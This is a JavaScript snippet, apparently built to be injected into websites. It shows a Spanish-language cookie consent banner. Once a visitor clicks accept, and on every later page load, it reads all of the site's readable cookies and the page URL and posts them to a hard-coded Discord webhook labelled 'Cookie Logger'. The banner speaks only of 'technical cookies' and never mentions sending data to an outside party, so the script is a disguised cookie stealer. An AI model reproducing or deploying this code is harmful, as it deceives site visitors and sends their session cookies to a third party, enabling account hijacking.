(() => {
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1392215955202899988/0R-ovZqLiDQymCUo55uYjHNAjZfRQ8LA8rtqNKj2KvGfGB5sGO53fgRtQU9to38Dngyg"; // Cambia aquí

  function crearBanner() {
    if (document.getElementById("cookie-banner")) return;
    const banner = document.createElement("div");
    banner.id = "cookie-banner";
    banner.style = `
      position: fixed; bottom: 0; left: 0; right: 0; background: white; 
      padding: 15px; border-top: 1px solid #ccc; text-align: center; 
      font-family: sans-serif; z-index: 9999; box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
    `;
    banner.innerHTML = `
      <p><strong>Este sitio usa cookies técnicas.</strong><br>
      ¿Aceptas que recopilemos las cookies visibles?</p>
      <button id="accept-btn" style="margin:5px;padding:8px 16px; background:#4CAF50; color:white; border:none; border-radius:5px; cursor:pointer;">Aceptar</button>
      <button id="reject-btn" style="margin:5px;padding:8px 16px; background:#f44336; color:white; border:none; border-radius:5px; cursor:pointer;">Rechazar</button>
    `;
    document.body.appendChild(banner);
    document.getElementById("accept-btn").onclick = () => handleConsent(true);
    document.getElementById("reject-btn").onclick = () => handleConsent(false);
  }

  function handleConsent(accepted) {
    document.cookie = `cookies_aceptadas=${accepted}; path=/; max-age=31536000`;
    const banner = document.getElementById("cookie-banner");
    if (banner) banner.style.display = "none";
    if (accepted) enviarCookies();
  }

  function enviarCookies() {
    const cookies = parseCookies(document.cookie);
    if (Object.keys(cookies).length === 0) {
      console.log("No hay cookies visibles para enviar.");
      return;
    }

    const mensaje = `📄 **URL:** ${window.location.href}\n🍪 **Cookies visibles:**\n` +
      Object.entries(cookies).map(([k, v]) => `• \`${k}\` = \`${v}\``).join("\n");

    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Cookie Logger", content: mensaje })
    })
    .then(res => {
      if (res.ok) console.log("Cookies enviadas correctamente");
      else console.warn("Error enviando cookies", res.status);
    })
    .catch(console.error);
  }

  function parseCookies(str) {
    return str.split(";").reduce((acc, pair) => {
      const [k, v] = pair.trim().split("=");
      if (k) acc[k] = decodeURIComponent(v || "");
      return acc;
    }, {});
  }

  window.addEventListener("load", () => {
    const consentMatch = document.cookie.match(/cookies_aceptadas=([^;]+)/);
    if (consentMatch) {
      if (consentMatch[1] === "true") {
        enviarCookies();
      }
      const banner = document.getElementById("cookie-banner");
      if (banner) banner.style.display = "none";
    } else {
      crearBanner();
    }
  });
})();
